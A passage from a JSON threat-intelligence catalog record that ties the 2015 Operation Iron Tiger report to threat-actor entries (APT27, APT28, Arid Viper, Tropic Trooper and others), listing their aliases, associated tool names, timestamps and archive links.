            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2015/2015.09.17.Operation_Iron_Tiger/wp-operation-iron-tiger.pdf"
    ],
    "report_names": [
        "wp-operation-iron-tiger"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f3b19931-3751-4ece-a235-15b397951dc2",
            "created_at": "2022-10-25T16:07:23.889537Z",
            "updated_at": "2025-03-27T02:02:10.015565Z",
            "deleted_at": null,
            "main_name": "Nazar",
            "aliases": [
                "SIG37"
            ],
            "source_name": "ETDA:Nazar",
            "tools": [
                "Distribute.exe",
                "EYService",
                "GpUpdates.exe",
                "Microolap Packet Sniffer",
                "TCPDUMP for Windows"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "9ff60d4d-153b-4ed5-a2f7-18a21d2fa05d",
            "created_at": "2022-10-25T16:07:23.539852Z",
            "updated_at": "2025-03-27T02:02:09.853285Z",
            "deleted_at": null,
            "main_name": "Desert Falcons",
            "aliases": [
                "APT-C-23",
                "ATK 66",
                "Arid Viper",
                "Operation Arid Viper",
                "Operation Bearded Barbie",
                "Operation Rebound",
                "TAG-63",
                "TAG-CT1",
                "Two-tailed Scorpion"
            ],
            "source_name": "ETDA:Desert Falcons",
            "tools": [
                "AridSpy",
                "Barb(ie) Downloader",
                "BarbWire",
                "Desert Scorpion",
                "FrozenCell",
                "GlanceLove",
                "GnatSpy",
                "KasperAgent",
                "Micropsia",
                "PyMICROPSIA",
                "SpyC23",
                "Viper RAT",
                "ViperRAT",
                "VolatileVenom",
                "WinkChat",
                "android.micropsia"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "e3492534-85a6-4c87-a754-5ae4a56d7c8c",
            "created_at": "2022-10-25T15:50:23.819113Z",
            "updated_at": "2025-03-27T02:00:55.552554Z",
            "deleted_at": null,
            "main_name": "Threat Group-3390",
            "aliases": [
                "Threat Group-3390",
                "Earth Smilodon",
                "TG-3390",
                "Emissary Panda",
                "BRONZE UNION",
                "APT27",
                "Iron Tiger",
                "LuckyMouse"
            ],
            "source_name": "MITRE:Threat Group-3390",
            "tools": [
                "Systeminfo",
                "gsecdump",
                "PlugX",
                "ASPXSpy",
                "Cobalt Strike",
                "Mimikatz",
                "Impacket",
                "gh0st RAT",
                "certutil",
                "China Chopper",
                "HTTPBrowser",
                "Tasklist",
                "netstat",
                "SysUpdate",
                "HyperBro",
                "ZxShell",
                "RCSession",
                "ipconfig",
                "Clambling",
                "pwdump",
                "NBTscan",
                "Pandora",
                "Windows Credential Editor"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "b1979c55-037a-415f-b0a3-cab7933f5cd4",
            "created_at": "2024-04-24T02:00:49.561432Z",
            "updated_at": "2025-03-27T02:00:55.493381Z",
            "deleted_at": null,
            "main_name": "APT-C-23",
            "aliases": [
                "APT-C-23",
                "Arid Viper",
                "Desert Falcon",
                "TAG-63",
                "Grey Karkadann",
                "Big Bang APT",
                "Two-tailed Scorpion"
            ],
            "source_name": "MITRE:APT-C-23",
            "tools": [
                "Micropsia"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "2c980ea7-04c4-4193-8535-52f87e66a96e",
            "created_at": "2024-05-01T02:03:07.994126Z",
            "updated_at": "2025-03-27T02:05:17.293799Z",
            "deleted_at": null,
            "main_name": "BRONZE UNION",
            "aliases": [
                "Budworm ",
                "Emissary Panda ",
                "Iron Tiger ",
                "Lucky Mouse ",
                "TG-3390 ",
                "Temp.Hippo ",
                "APT27 "
            ],
            "source_name": "Secureworks:BRONZE UNION",
            "tools": [
                " ASPXSpy",
                " China Chopper",
                " Enfal",
                " Gh0st RAT",
                " HttpBrowser",
                " Hunter",
                " HyperBro",
                " OwaAuth",
                " PlugX",
                " PoisonIvy",
                " Sysupdate",
                " ZxShell",
                "9002"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "77c08a4a-b3f9-43ee-9d84-04ba572b7564",
            "created_at": "2024-05-01T02:03:07.927023Z",
            "updated_at": "2025-03-27T02:05:17.248836Z",
            "deleted_at": null,
            "main_name": "ALUMINUM SHADYSIDE",
            "aliases": [
                "Arid Viper ",
                "Desert Falcon ",
                "APT-C-23 "
            ],
            "source_name": "Secureworks:ALUMINUM SHADYSIDE",
            "tools": [
                " SpyC23",
                "Micropsia"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "e3767160-695d-4360-8b2e-d5274db3f7cd",
            "created_at": "2022-10-25T16:47:55.914348Z",
            "updated_at": "2025-03-27T02:05:17.411172Z",
            "deleted_at": null,
            "main_name": "IRON TWILIGHT",
            "aliases": [
                "ATK5 ",
                "Blue Athena ",
                "BlueDelta ",
                "FROZENLAKE ",
                "Fancy Bear ",
                "Fighting Ursa ",
                "Forest Blizzard ",
                "GRAPHITE ",
                "Group 74 ",
                "PawnStorm ",
                "STRONTIUM ",
                "Sednit ",
                "Snakemackerel ",
                "Sofacy ",
                "TG-4127 ",
                "Tsar Team ",
                "APT28 "
            ],
            "source_name": "Secureworks:IRON TWILIGHT",
            "tools": [
                " Downdelph",
                " Drovorub",
                " EVILTOSS",
                " HIDEDRV",
                " Headlace",
                " LoJack",
                " Powershell Empire",
                " SCONATO",
                " SEDUPLOADER",
                " SHARPFRONT",
                " Scaramouche",
                " Sedkit Exploit Kit",
                " Sofacy downloader",
                " X-Agent",
                " X-Tunnel",
                " Zebrocy",
                " reGeorg",
                "DEALERSCHOICE"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "efe6ff9a-822d-41a6-90c3-45265cac696b",
            "created_at": "2024-05-01T02:03:07.920302Z",
            "updated_at": "2025-03-27T02:05:17.246342Z",
            "deleted_at": null,
            "main_name": "ALUMINUM SARATOGA",
            "aliases": [
                "Arid Viper",
                "Desert Falcon",
                "Extreme Jackal ",
                "Gaza CyberGang",
                "Gaza CyberGang",
                "Molerats ",
                "Operation DustySky ",
                "TA402",
                "APT-C-23"
            ],
            "source_name": "Secureworks:ALUMINUM SARATOGA",
            "tools": [
                " BrittleBush",
                " DarkComet",
                " LastConn",
                " Micropsia",
                " NimbleMamba",
                " PoisonIvy",
                " QuasarRAT",
                " XtremeRat",
                "BlackShades"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "c63ab035-f9f2-4723-959b-97a7b98b5942",
            "created_at": "2023-01-06T13:46:38.298354Z",
            "updated_at": "2025-03-27T02:00:02.798255Z",
            "deleted_at": null,
            "main_name": "APT27",
            "aliases": [
                "TG-3390",
                "EMISSARY PANDA",
                "TEMP.Hippo",
                "Budworm",
                "Group 35",
                "BRONZE UNION",
                "Lucky Mouse",
                "Iron Taurus",
                "GreedyTaotie",
                "Red Phoenix",
                "ZipToken",
                "Iron Tiger",
                "G0027",
                "Earth Smilodon"
            ],
            "source_name": "MISPGALAXY:APT27",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2025-03-27T02:00:02.821388Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "FROZENLAKE",
                "BlueDelta",
                "SNAKEMACKEREL",
                "TG-4127",
                "ITG05",
                "TA422",
                "Fancy Bear",
                "FANCY BEAR",
                "Sednit",
                "IRON TWILIGHT",
                "G0007",
                "Sofacy",
                "Forest Blizzard",
                "GruesomeLarch",
                "Pawn Storm",
                "Tsar Team",
                "STRONTIUM",
                "ATK5",
                "Blue Athena",
                "APT-C-20",
                "Group 74",
                "SIG40",
                "Grizzly Steppe",
                "Fighting Ursa",
                "T-APT-12",
                "UAC-0028"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "929d794b-0e1d-4d10-93a6-29408a527cc2",
            "created_at": "2023-01-06T13:46:38.70844Z",
            "updated_at": "2025-03-27T02:00:02.897573Z",
            "deleted_at": null,
            "main_name": "AridViper",
            "aliases": [
                "Arid Viper",
                "APT-C-23",
                "Bearded Barbie",
                "Desert Falcon"
            ],
            "source_name": "MISPGALAXY:AridViper",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ae320ed7-9a63-42ed-944b-44ada7313495",
            "created_at": "2022-10-25T15:50:23.671663Z",
            "updated_at": "2025-03-27T02:00:55.518748Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "APT28",
                "IRON TWILIGHT",
                "SNAKEMACKEREL",
                "Group 74",
                "Sednit",
                "Sofacy",
                "Pawn Storm",
                "Fancy Bear",
                "STRONTIUM",
                "Tsar Team",
                "Threat Group-4127",
                "TG-4127",
                "Forest Blizzard",
                "FROZENLAKE"
            ],
            "source_name": "MITRE:APT28",
            "tools": [
                "Wevtutil",
                "certutil",
                "Forfiles",
                "DealersChoice",
                "Mimikatz",
                "ADVSTORESHELL",
                "Komplex",
                "HIDEDRV",
                "JHUHUGIT",
                "Koadic",
                "Winexe",
                "XTunnel",
                "Drovorub",
                "CORESHELL",
                "OLDBAIT",
                "Downdelph",
                "XAgentOSX",
                "USBStealer",
                "Zebrocy",
                "Fysbis",
                "LoJax"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "5c13338b-eaed-429a-9437-f5015aa98276",
            "created_at": "2022-10-25T16:07:23.582715Z",
            "updated_at": "2025-03-27T02:02:09.875151Z",
            "deleted_at": null,
            "main_name": "Emissary Panda",
            "aliases": [
                "APT 27",
                "ATK 15",
                "Bronze Union",
                "Budworm",
                "Earth Smilodon",
                "Emissary Panda",
                "Group 35",
                "Iron Taurus",
                "Iron Tiger",
                "LuckyMouse",
                "Operation DRBControl",
                "Operation Iron Tiger",
                "Operation PZChao",
                "Operation SpoiledLegacy",
                "Operation StealthyTrident",
                "Red Phoenix",
                "TEMP.Hippo",
                "TG-3390",
                "ZipToken"
            ],
            "source_name": "ETDA:Emissary Panda",
            "tools": [
                "ASPXSpy",
                "ASPXTool",
                "Agent.dhwf",
                "AngryRebel",
                "Antak",
                "CHINACHOPPER",
                "China Chopper",
                "Destroy RAT",
                "DestroyRAT",
                "FOCUSFJORD",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HTTPBrowser",
                "HTran",
                "HUC Packet Transmit Tool",
                "HighShell",
                "HttpBrowser RAT",
                "HttpDump",
                "HyperBro",
                "HyperSSL",
                "HyperShell",
                "Kaba",
                "Korplug",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Mimikatz",
                "Moudour",
                "Mydoor",
                "Nishang",
                "OwaAuth",
                "PCRat",
                "PlugX",
                "ProcDump",
                "PsExec",
                "RedDelta",
                "SEASHARPEE",
                "Sensocode",
                "SinoChopper",
                "Sogu",
                "SysUpdate",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "Token Control",
                "TokenControl",
                "TwoFace",
                "WCE",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "Xamtrav",
                "ZXShell",
                "gsecdump",
                "luckyowa"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "578f8e62-2bb4-4ce4-a8b7-6c868fa29724",
            "created_at": "2022-10-25T16:07:24.344358Z",
            "updated_at": "2025-03-27T02:02:10.182282Z",
            "deleted_at": null,
            "main_name": "Tropic Trooper",
            "aliases": [
                "APT 23",
                "Bronze Hobart",
                "Earth Centaur",
                "KeyBoy",
                "Operation Tropic Trooper",
                "Pirate Panda",
                "Tropic Trooper"
            ],
            "source_name": "ETDA:Tropic Trooper",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "ByPassGodzilla",
                "CHINACHOPPER",
                "CREDRIVER",
                "China Chopper",
                "Chymine",
                "Darkmoon",
                "Gen:Trojan.Heur.PT",
                "KeyBoy",
                "Neo-reGeorg",
                "PCShare",
                "POISONPLUG.SHADOW",
                "Poison Ivy",
                "RoyalRoad",
                "SPIVY",
                "ShadowPad Winnti",
                "SinoChopper",
                "Swor",
                "TSSL",
                "USBferry",
                "W32/Seeav",
                "Winsloader",
                "XShellGhost",
                "Yahoyah",
                "fscan",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d2516b8e-e74f-490d-8a15-43ad6763c7ab",
            "created_at": "2022-10-25T16:07:24.212584Z",
            "updated_at": "2025-03-27T02:02:10.141001Z",
            "deleted_at": null,
            "main_name": "Sofacy",
            "aliases": [
                "APT 28",
                "ATK 5",
                "Blue Athena",
                "BlueDelta",
                "FROZENLAKE",
                "Fancy Bear",
                "Fighting Ursa",
                "Forest Blizzard",
                "Grey-Cloud",
                "Grizzly Steppe",
                "Group 74",
                "GruesomeLarch",
                "ITG05",
                "Iron Twilight",
                "Operation DealersChoice",
                "Operation Dear Joohn",
                "Operation Komplex",
                "Operation Pawn Storm",
                "Operation Russian Doll",
                "Operation Steal-It",
                "Pawn Storm",
                "SIG40",
                "Sednit",
                "Snakemackerel",
                "Sofacy",
                "Strontium",
                "T-APT-12",
                "TA422",
                "TAG-0700",
                "TAG-110",
                "TG-4127",
                "Tsar Team",
                "UAC-0028",
                "UAC-0063"
            ],
            "source_name": "ETDA:Sofacy",
            "tools": [
                "ADVSTORESHELL",
                "AZZY",
                "Backdoor.SofacyX",
                "CHERRYSPY",
                "CORESHELL",
                "Carberp",
                "Computrace",
                "DealersChoice",
                "Delphacy",
                "Downdelph",
                "Downrage",
                "Drovorub",
                "EVILTOSS",
                "Foozer",
                "GAMEFISH",
                "GooseEgg",
                "Graphite",
                "HATVIBE",
                "HIDEDRV",
                "Headlace",
                "Impacket",
                "JHUHUGIT",
                "JKEYSKW",
                "Koadic",
                "Komplex",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "LoJack",
                "LoJax",
                "MASEPIE",
                "Mimikatz",
                "NETUI",
                "Nimcy",
                "OCEANMAP",
                "OLDBAIT",
                "PocoDown",
                "PocoDownloader",
                "Popr-d30",
                "ProcDump",
                "PythocyDbg",
                "SMBExec",
                "SOURFACE",
                "SPLM",
                "STEELHOOK",
                "Sasfis",
                "Sedkit",
                "Sednit",
                "Sedreco",
                "Seduploader",
                "Shunnael",
                "SkinnyBoy",
                "Sofacy",
                "SofacyCarberp",
                "SpiderLabs Responder",
                "Trojan.Shunnael",
                "Trojan.Sofacy",
                "USB Stealer",
                "USBStealer",
                "VPNFilter",
                "Win32/USBStealer",
                "WinIDS",
                "Winexe",
                "X-Agent",
                "X-Tunnel",
                "XAPS",
                "XTunnel",
                "Xagent",
                "Zebrocy",
                "Zekapab",
                "carberplike",
                "certutil",
                "certutil.exe",
                "fysbis",
                "webhp"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716504,
    "ts_updated_at": 1743041831,
    "ts_creation_date": 1442403765,
    "ts_modification_date": 1442403823,
    "files": {
        "pdf": "https://archive.orkl.eu/5ee4cfb8802fd6a2dc6d936357a6ce16878778cf.pdf",
        "text": "https://archive.orkl.eu/5ee4cfb8802fd6a2dc6d936357a6ce16878778cf.txt",
        "img": "https://archive.orkl.eu/5ee4cfb8802fd6a2dc6d936357a6ce16878778cf.jpg"
    }
}